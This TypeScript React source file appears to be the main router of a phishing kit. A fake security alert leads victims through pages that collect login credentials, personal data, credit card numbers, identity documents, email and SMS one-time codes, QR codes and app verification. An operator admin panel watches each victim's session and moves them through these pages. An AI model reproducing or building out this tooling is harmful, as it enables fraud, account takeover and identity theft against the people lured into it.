import { useState, useEffect } from 'react';
import { LanguageProvider } from './components/LanguageContext';
import { SessionProvider, useSession } from './contexts/SessionContext';
import Favicon from './components/Favicon';

// Client pages
import SecurityAlertPage from './components/client/SecurityAlertPage';
import LoginPage from './components/client/LoginPage';
import LoadingPage from './components/client/LoadingPage';
import PersonalDataPage from './components/client/PersonalDataPage';
import CreditCardPage from './components/client/CreditCardPage';
import DocumentUploadPage from './components/client/DocumentUploadPage';
import EmailOTPPage from './components/client/EmailOTPPage';
import SMSOTPPage from './components/client/SMSOTPPage';
import QRCodePage from './components/client/QRCodePage';
import QRUploadPage from './components/client/QRUploadPage';
import URLVerificationPage from './components/client/URLVerificationPage';
import WhatsAppSupportPage from './components/client/WhatsAppSupportPage';
import AppVerificationPage from './components/client/AppVerificationPage';
import WrongDetailsPage from './components/client/WrongDetailsPage';
import SuccessPage from './components/client/SuccessPage';

// Admin pages
import AdminLogin from './components/admin/AdminLogin';
import AdminDashboard from './components/admin/AdminDashboard';
import AdminClientView from './components/admin/AdminClientView';

function ClientApp() {
  const { currentPage, setCurrentPage, submitLoginData } = useSession();

  const handleSecureAccount = () => {
    setCurrentPage('login');
  };

  const handleLogin = (data: any) => {
    submitLoginData(data);
  };

  // Render current page
  const renderPage = () => {
    switch (currentPage) {
      case 'alert':
        return <SecurityAlertPage onSecureAccount={handleSecureAccount} />;
      case 'login':
        return <LoginPage onLogin={handleLogin} />;
      case 'loading':
        return <LoadingPage />;
      case 'personal-data':
        return <PersonalDataPage />;
      case 'credit-card':
        return <CreditCardPage />;
      case 'document-upload':
        return <DocumentUploadPage />;
      case 'email-otp':
        return <EmailOTPPage />;
      case 'sms-otp':
        return <SMSOTPPage />;
      case 'qr-code':
        return <QRCodePage />;
      case 'qr-upload':
        return <QRUploadPage />;
      case 'url-verification':
        return <URLVerificationPage />;
      case 'whatsapp-support':
        return <WhatsAppSupportPage />;
      case 'app-verification':
        return <AppVerificationPage />;
      case 'wrong-details':
        return <WrongDetailsPage />;
      case 'success':
        return <SuccessPage />;
      default:
        return <SecurityAlertPage onSecureAccount={handleSecureAccount} />;
    }
  };

  return (
    <>
      <Favicon />
      {renderPage()}
    </>
  );
}

function AdminApp() {
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [route, setRoute] = useState<{ type: 'dashboard' | 'client'; clientId?: string }>({ type: 'dashboard' });

  useEffect(() => {
    const adminSession = sessionStorage.getItem('admin_logged_in');
    if (adminSession === 'true') {
      setIsLoggedIn(true);
    }

    // Parse route from hash
    const parseRoute = () => {
      const hash = window.location.hash;
      
      // Check for client view route: #/admin/client/:id
      const clientMatch = hash.match(/#\/admin\/client\/([^/?]+)/);
      if (clientMatch) {
        setRoute({ type: 'client', clientId: clientMatch[1] });
        return;
      }
      
      // Default to dashboard
      setRoute({ type: 'dashboard' });
    };

    parseRoute();
    
    // Listen for hash changes
    window.addEventListener('hashchange', parseRoute);
    return () => window.removeEventListener('hashchange', parseRoute);
  }, []);

  const handleLogin = () => {
    sessionStorage.setItem('admin_logged_in', 'true');
    setIsLoggedIn(true);
  };

  if (!isLoggedIn) {
    return <AdminLogin onLogin={handleLogin} />;
  }

  // Route to client view or dashboard
  if (route.type === 'client' && route.clientId) {
    return <AdminClientView clientId={route.clientId} />;
  }

  return <AdminDashboard />;
}

export default function App() {
  // Check if URL contains /admin to show admin panel
  const [isAdmin, setIsAdmin] = useState(() => {
    const hash = window.location.hash;
    return hash.startsWith('#/admin');
  });

  // Listen for hash changes to update admin state
  useEffect(() => {
    const handleHashChange = () => {
      const hash = window.location.hash;
      setIsAdmin(hash.startsWith('#/admin'));
    };

    window.addEventListener('hashchange', handleHashChange);
    return () => window.removeEventListener('hashchange', handleHashChange);
  }, []);

  // If admin route, render AdminApp immediately
  if (isAdmin) {
    return (
      <>
        <Favicon />
        <AdminApp />
      </>
    );
  }

  // Otherwise render client app
  return (
    <LanguageProvider>
      <SessionProvider>
        <ClientApp />
      </SessionProvider>
    </LanguageProvider>
  );
}
